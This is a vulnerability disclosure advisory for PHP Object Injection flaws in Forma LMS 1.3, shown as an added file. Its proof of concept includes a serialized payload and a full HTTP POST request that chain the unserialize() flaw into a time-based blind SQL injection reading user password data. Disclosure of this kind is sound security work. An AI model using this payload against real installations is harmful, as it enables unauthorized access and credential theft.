@@ -1,0 +1,56 @@
+Forma LMS 1.3 Multiple PHP Object Injection Vulnerabilities
+
+[+] Author: Filippo Roncari
+[+] Target: Forma LMS 
+[+] Version: 1.3 and probably lower
+[+] Vendor: http://www.formalms.org
+[+] Accessibility: Remote
+[+] Severity: High
+[+] CVE: <requested>
+[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-03_Formalms.pdf
+[+] Info: f.roncari@securenetwork.it / f@unsec.it
+
+
+[+] Summary
+Forma LMS is a corporate oriented Learning Management System, used to manage and deliver online training courses. Forma LMS is SCORM compliant with enterprise class features like multi-client architecture, custom report generation, native ecommerce and catalogue management, integration API, and more.
+
+
+[+] Vulnerability Details
+Forma LMS 1.3 is prone to multiple PHP Object Injection vulnerabilities, due to a repeated unsafe use of the unserialize() function, which allows unprivileged users to inject arbitrary PHP objects. A potential attacker could exploit this vulnerability by sending specially crafted requests to the web application containing malicious serialized input, in order to execute code on the remote server or abuse arbitrary functionalities.
+
+
+[+] Technical Details
+See full advisory at https://www.securenetwork.it/docs/advisory/SN-15-03_Formalms.pdf for the list of identified OI flaws and further technical details.
+
+
+[+] Proof of Concept (PoC)
+The following PoC shows how to abuse the unsafe unserialize() called in writemessage() function in order to trigger a SQL injection flaw. This is an alternative way to exploit one of the identified OI, since a quick check did not highlight useful magic methods. The PoC as well as the other identified vulnerabilities are further detailed in the full advisory. 
+
+
+	[!] PoC Payload
+	----------------------------
+	a:2:{i:0;s:122:"0) union select if(substring(pass,1,1) = char(53),benchmark(5000000,encode(1,2)),null) from core_user where idst=11836-- ";i:1;s:1:"1";}
+	----------------------------
+
+	[!] PoC Request
+	----------------------------
+	POST /formalms/appLms/index.php?modname=message&op=writemessage HTTP/1.1
+	Host: localhost
+	Cookie: docebo_session=91853e7eca413578de70304f94a43fe1
+	Content-Type: multipart/form-data; boundary=---------------------------1657367614367103261183989796 
+	Content-Length: 1453
+
+	[...]
+
+	-----------------------------1657367614367103261183989796 
+	Content-Disposition: form-data; name="message[recipients]"
+
+	a%3A2%3A%7Bi%3A0%3Bs%3A122%3A%220%29+union+SELECT+IF%28SUBSTRING%28pass%2C1%2C1%29+%3D+ char%2853%29%2Cbenchmark%285000000%2Cencode%281%2C2%29%29%2Cnull%29+from+core_user+where+idst% 3D11836--++%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D
+
+	[...]
+	--------------------------
+
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
